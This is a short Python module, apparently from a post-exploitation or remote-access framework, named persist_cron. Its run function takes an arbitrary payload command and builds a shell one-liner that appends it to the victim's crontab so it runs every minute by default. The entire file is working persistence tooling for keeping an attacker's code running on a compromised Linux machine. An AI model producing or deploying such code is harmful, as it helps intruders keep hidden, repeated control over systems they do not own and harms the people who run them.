"""
modules/persist_cron.py — Linux Crontab Persistence Module

Generates a command to install a crontab entry that executes the
payload every minute (or at a custom interval).
"""

MODULE_INFO = {
    "name": "persist_cron",
    "description": "Add a crontab entry for persistence (Linux only)",
    "author": "Hider",
    "platform": "linux",
}


def run(session, args):
    """
    args[0] = payload command to persist
    args[1] = (optional) cron schedule (default: '* * * * *' = every minute)
    """
    if not args or len(args) < 1:
        return "[!] Usage: persist_cron <payload_command> [cron_schedule]"

    payload = args[0]
    schedule = args[1] if len(args) > 1 else "* * * * *"

    return (
        f'(crontab -l 2>/dev/null; echo "{schedule} {payload}") | crontab -'
    )
